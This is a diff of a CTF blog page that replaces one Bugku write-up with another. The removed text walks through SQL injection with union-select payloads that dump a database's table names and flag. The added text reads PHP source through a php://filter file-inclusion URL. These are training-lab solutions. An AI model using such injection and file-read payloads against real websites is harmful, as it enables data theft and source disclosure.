@@ -103,7 +103,7 @@
 
 
 
-  <meta name="keywords" content="Bugku,Web," />
+  <meta name="keywords" content="Web,Bugku,文件包含," />
 
 
 
@@ -114,18 +114,18 @@
 
 
 
-<meta name="description" content="题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&amp;#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&amp;#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&amp;#39; union selec">
-<meta name="keywords" content="Bugku,Web">
+<meta name="description" content="题目地址： http://120.24.86.145:8005/post/ 进入题目后看到只有一个可点击的文字点击之后跳转到http://120.24.86.145:8005/post/index.php?file=show.php 想到题目是：flag在index里那么可能是文件包含构造url：http://120.24.86.145:8005/post/index.php?file=php:/">
+<meta name="keywords" content="Web,Bugku,文件包含">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WP-Bugku-成绩单">
-<meta property="og:url" content="http://AbelChe.com/2018/08/05/Bugku-成绩单/index.html">
+<meta property="og:title" content="WP-Bugku-flag在index里">
+<meta property="og:url" content="http://AbelChe.com/2018/08/08/Writeup/WP-Bugku-flag在index里/index.html">
 <meta property="og:site_name" content="AbelChe&#39;s Blog">
-<meta property="og:description" content="题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&amp;#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&amp;#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&amp;#39; union selec">
+<meta property="og:description" content="题目地址： http://120.24.86.145:8005/post/ 进入题目后看到只有一个可点击的文字点击之后跳转到http://120.24.86.145:8005/post/index.php?file=show.php 想到题目是：flag在index里那么可能是文件包含构造url：http://120.24.86.145:8005/post/index.php?file=php:/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-08-08T06:16:33.231Z">
+<meta property="og:updated_time" content="2018-08-08T09:21:15.520Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WP-Bugku-成绩单">
-<meta name="twitter:description" content="题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&amp;#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&amp;#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&amp;#39; union selec">
+<meta name="twitter:title" content="WP-Bugku-flag在index里">
+<meta name="twitter:description" content="题目地址： http://120.24.86.145:8005/post/ 进入题目后看到只有一个可点击的文字点击之后跳转到http://120.24.86.145:8005/post/index.php?file=show.php 想到题目是：flag在index里那么可能是文件包含构造url：http://120.24.86.145:8005/post/index.php?file=php:/">
 
 
 
@@ -155,13 +155,13 @@
 
 
 
-  <link rel="canonical" href="http://AbelChe.com/2018/08/05/Bugku-成绩单/"/>
+  <link rel="canonical" href="http://AbelChe.com/2018/08/08/Writeup/WP-Bugku-flag在index里/"/>
 
 
 
 
 
-  <title>WP-Bugku-成绩单 | AbelChe's Blog</title>
+  <title>WP-Bugku-flag在index里 | AbelChe's Blog</title>
   
 
 
@@ -332,7 +332,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://AbelChe.com/2018/08/05/Bugku-成绩单/">
+    <link itemprop="mainEntityOfPage" href="http://AbelChe.com/2018/08/08/Writeup/WP-Bugku-flag在index里/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="AbelChe">
@@ -349,7 +349,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">WP-Bugku-成绩单</h2>
+          <h2 class="post-title" itemprop="name headline">WP-Bugku-flag在index里</h2>
         
 
         <div class="post-meta">
@@ -361,8 +361,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-05T17:03:19+08:00">
-                2018-08-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-08T13:40:23+08:00">
+                2018-08-08
               </time>
             
 
@@ -377,7 +377,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-08T14:16:33+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-08T17:21:15+08:00">
                 2018-08-08
               </time>
             
@@ -432,7 +432,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  174 字
+                  112 字
                 </span>
               
 
@@ -469,19 +469,10 @@
       
 
       
-        <p>题目地址：<a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a></p>
-<p>进入这道题目 我们先手遍历一遍<code>id=-1&#39; union select 1,2,3,4#</code></p>
-<p>发现有四个表且都有回显</p>
-<p>于是 就开始爆破吧</p>
-<p>通过<br><code>id=-1&#39; union select 1,2,3,database()#</code>得到数据库名字skctf_flag</p>
-<p>之后通过<br><code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>得到表名fl4g,sc</p>
-<p>很显然我们需要的数据在fl4g这个表里</p>
-<p>接下来我们就要暴字段了</p>
-<p>通过<code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#</code></p>
-<p>得到字段skctf_flag</p>
-<p>最后我们就可以开始查询数据了</p>
-<p>通过<code>id=-1&#39; union select 1,2,3,skctf_flag from fl4g#</code></p>
-<p>得到BUGKU{Sql_INJECT0N_4813drd8hz4}</p>
+        <p>题目地址： <a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a></p>
+<p>进入题目后看到只有一个可点击的文字<br>点击之后跳转到<a href="http://120.24.86.145:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=show.php</a></p>
+<p>想到题目是：flag在index里<br>那么可能是文件包含<br>构造url：<br><a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a><br>得到了一串base64加密的字符串<br>base64解密得到包含flag的代码<br>得到flag{edulcni_elif_lacol_si_siht}</p>
+<hr>
 
       
     </div>
@@ -539,7 +530,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://AbelChe.com/2018/08/05/Bugku-成绩单/" title="WP-Bugku-成绩单">http://AbelChe.com/2018/08/05/Bugku-成绩单/</a>
+    <a href="http://AbelChe.com/2018/08/08/Writeup/WP-Bugku-flag在index里/" title="WP-Bugku-flag在index里">http://AbelChe.com/2018/08/08/Writeup/WP-Bugku-flag在index里/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -554,9 +545,11 @@
       
         <div class="post-tags">
           
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
             <a href="/tags/Bugku/" rel="tag"># Bugku</a>
           
-            <a href="/tags/Web/" rel="tag"># Web</a>
+            <a href="/tags/文件包含/" rel="tag"># 文件包含</a>
           
         </div>
       
@@ -584,8 +577,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/25/常规SQL注入笔记/" rel="next" title="常规SQL注入笔记">
-                <i class="fa fa-chevron-left"></i> 常规SQL注入笔记
+              <a href="/2018/08/08/sqlmap常规使用/" rel="next" title="sqlmap常规使用">
+                <i class="fa fa-chevron-left"></i> sqlmap常规使用
               </a>
             
           </div>
@@ -594,8 +587,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/07/SQL手工注入常用语句/" rel="prev" title="SQL手工注入常用语句">
-                SQL手工注入常用语句 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/08/PHP函数漏洞/" rel="prev" title="PHP函数漏洞">
+                PHP函数漏洞 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -670,7 +663,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -692,7 +685,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -811,7 +804,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">10.6k</span>
+    <span title="Site words total count">12.5k</span>
   
 </div>
 
